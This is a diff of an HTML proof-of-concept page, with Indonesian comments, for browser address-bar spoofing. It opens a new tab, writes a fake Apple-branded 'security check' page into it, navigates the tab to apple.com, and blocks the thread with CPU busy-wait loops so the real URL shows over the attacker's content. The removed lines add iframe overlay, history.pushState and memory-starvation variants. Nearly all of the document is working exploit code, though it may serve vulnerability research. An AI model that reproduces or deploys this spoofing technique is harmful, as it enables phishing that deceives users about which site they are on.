@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Multi-Vector Spoofing Test PoC</title>
+    <title>Navigation Method Variant PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -14,7 +14,7 @@
         height: 100%;
         background: #111;
         color: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
         display: flex;
         flex-direction: column;
         align-items: center;
@@ -25,7 +25,7 @@
         flex-direction: column;
         gap: 15px;
         width: 90%;
-        max-width: 400px;
+        max-width: 420px;
       }
       button {
         padding: 16px 20px;
@@ -37,114 +37,101 @@
         cursor: pointer;
         box-shadow: 0 4px 10px rgba(0,0,0,0.3);
       }
-      .btn-1 { background: #007aff; }
-      .btn-2 { background: #34c759; }
-      .btn-3 { background: #ff9500; }
-      .btn-4 { background: #ff3b30; }
+      .btn-replace { background: #007aff; }
+      .btn-assign { background: #34c759; }
+      .btn-self { background: #ff9500; }
+      .btn-location { background: #af52de; }
     </style>
   </head>
   <body>
 
     <div class="container">
-      <h2 style="text-align:center; margin-bottom:10px; font-size:20px;">Vektor Uji Coba Navigasi</h2>
+      <h2 style="text-align:center; font-size:18px; margin-bottom:10px;">Variasi Metode Navigasi Tab Baru</h2>
       
-      <!-- Vektor 1: Standard Window.open dengan dokumen kosong -->
-      <button class="btn-1" id="btnStandard">1. Standard window.open()</button>
+      <!-- 1. Menggunakan location.replace() -->
+      <button class="btn-replace" id="btnReplace">1. location.replace()</button>
 
-      <!-- Vektor 2: Navigasi via Iframe Overlay di Tab yang Sama -->
-      <button class="btn-2" id="btnIframe">2. Iframe State Injection</button>
+      <!-- 2. Menggunakan location.assign() -->
+      <button class="btn-assign" id="btnAssign">2. location.assign()</button>
 
-      <!-- Vektor 3: History API State Push + Sync Loop -->
-      <button class="btn-3" id="btnHistory">3. History PushState Vector</button>
+      <!-- 3. Menggunakan properti self / top assignment -->
+      <button class="btn-self" id="btnSelf">3. self.location / top.location</button>
 
-      <!-- Vektor 4: Multi-Thread Starvation (Busy-wait masif) -->
-      <button class="btn-4" id="btnAggressive">4. Aggressive CPU Starvation</button>
+      <!-- 4. Penugasan langsung objek location -->
+      <button class="btn-location" id="btnLocationObj">4. window.location = URL</button>
     </div>
 
     <script>
-      // Payload HTML Penyerang Bersama
-      const attackerPayload = `
+      const payloadHTML = `
         <!DOCTYPE html>
         <html>
-        <head><title>Apple - Verified</title></head>
+        <head><title>Apple - Security Test</title></head>
         <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
           <div>
-            <h1 style="font-size:36px;color:#1d1d1f;margin-bottom:10px;"> Apple Secure Check</h1>
-            <p style="font-size:16px;color:#86868b;">Simulasi penahanan status navigasi asinkron.</p>
+            <h1 style="font-size:36px;color:#1d1d1f;margin-bottom:10px;"> Security Validation</h1>
+            <p style="font-size:16px;color:#86868b;">Menguji variasi metode navigasi asinkron.</p>
           </div>
         </body>
         </html>
       `;
 
-      // 1. Vektor Standar (window.open)
-      document.getElementById("btnStandard").onclick = function () {
-        const win = window.open("about:blank", "_blank");
-        if (win) {
-          win.document.write(attackerPayload);
-          win.document.close();
-          setTimeout(() => { win.location.href = "https://apple.com"; }, 5);
+      // Fungsi generik untuk mengeksekusi tab baru + beban thread CPU
+      function runTest(navigationCallback) {
+        const newTab = window.open("about:blank", "_blank");
+
+        if (newTab) {
+          newTab.document.write(payloadHTML);
+          newTab.document.close();
+
+          // Pemicu navigasi dengan metode spesifik
           setTimeout(() => {
-            const start = Date.now();
-            while (Date.now() - start < 2500) { win.Math.random(); }
+            try {
+              navigationCallback(newTab);
+            } catch (e) {
+              console.error("Navigation error:", e);
+            }
+          }, 5);
+
+          // Beban CPU sinkron (Busy-Wait) untuk menguji respons thread utama
+          setTimeout(() => {
+            try {
+              const start = Date.now();
+              while (Date.now() - start < 3000) {
+                newTab.Math.random();
+              }
+            } catch (e) {
+              console.error("Thread block error:", e);
+            }
           }, 40);
         }
+      }
+
+      // 1. location.replace()
+      document.getElementById("btnReplace").onclick = function () {
+        runTest((win) => {
+          win.location.replace("https://apple.com");
+        });
       };
 
-      // 2. Vektor Iframe (Injeksi di halaman yang sama tanpa jendela baru)
-      document.getElementById("btnIframe").onclick = function () {
-        const iframe = document.createElement('iframe');
-        iframe.style.position = 'fixed';
-        iframe.style.top = '0';
-        iframe.style.left = '0';
-        iframe.style.width = '100%';
-        iframe.style.height = '100%';
-        iframe.style.border = 'none';
-        iframe.style.zIndex = '999999';
-        document.body.appendChild(iframe);
-
-        iframe.contentDocument.open();
-        iframe.contentDocument.write(attackerPayload);
-        iframe.contentDocument.close();
-
-        setTimeout(() => {
-          iframe.contentWindow.location.href = "https://apple.com";
-        }, 10);
+      // 2. location.assign()
+      document.getElementById("btnAssign").onclick = function () {
+        runTest((win) => {
+          win.location.assign("https://apple.com");
+        });
       };
 
-      // 3. Vektor History PushState
-      document.getElementById("btnHistory").onclick = function () {
-        try {
-          history.pushState({page: 1}, "Apple", "https://apple.com");
-          const start = Date.now();
-          while (Date.now() - start < 2000) {
-            Math.random();
-          }
-        } catch (e) {
-          console.error(e);
-        }
+      // 3. self.location / top.location
+      document.getElementById("btnSelf").onclick = function () {
+        runTest((win) => {
+          win.self.location = "https://apple.com";
+        });
       };
 
-      // 4. Vektor Aggressive CPU Starvation (Busy-wait lintas objek)
-      document.getElementById("btnAggressive").onclick = function () {
-        const win = window.open("about:blank", "_blank");
-        if (win) {
-          win.document.write(attackerPayload);
-          win.document.close();
-
-          setTimeout(() => {
-            win.location.href = "https://apple.com";
-          }, 2);
-
-          setTimeout(() => {
-            // Membebani CPU secara total agar interaksi bridge UI tertunda
-            let arr = [];
-            const start = Date.now();
-            while (Date.now() - start < 4000) {
-              arr.push(new Array(100000).fill(Math.random()));
-              if(arr.length > 50) arr = [];
-            }
-          }, 20);
-        }
+      // 4. Penugasan langsung window.location
+      document.getElementById("btnLocationObj").onclick = function () {
+        runTest((win) => {
+          win.window.location = "https://apple.com";
+        });
       };
     </script>
   </body>
